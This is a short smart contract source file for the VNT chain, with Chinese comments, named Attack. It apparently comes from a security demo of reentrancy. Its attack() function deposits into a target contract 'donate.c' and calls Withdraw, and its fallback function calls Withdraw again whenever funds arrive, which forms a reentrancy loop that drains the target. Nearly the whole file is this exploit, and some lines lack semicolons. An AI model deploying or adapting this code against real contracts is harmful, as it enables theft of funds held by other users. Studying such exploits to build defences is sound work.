#include "vntlib.h"

KEY address owner;

constructor Attack(){
    owner = GetSender();
}

// 结构体CallParams,结构体包含address,vnt,gas三个需要初始化的参数
CALL void Withdraw(CallParams params, uint256 amount);
CallParams params1 = {Address("donate.c"), U256(10000), 1000};
CALL void $donate(CallParams params);
CallParams params2 = {Address("donate.c"), U256(10000), 1000};

MUTABLE    // MUTABLE会修改状态变量
void attack() {
    $donate(params2)
    Withdraw(params1, 10)
}

// fallback函数，输入数据出错时，自动执行
$_() {
    Withdraw(params1, 10)
}
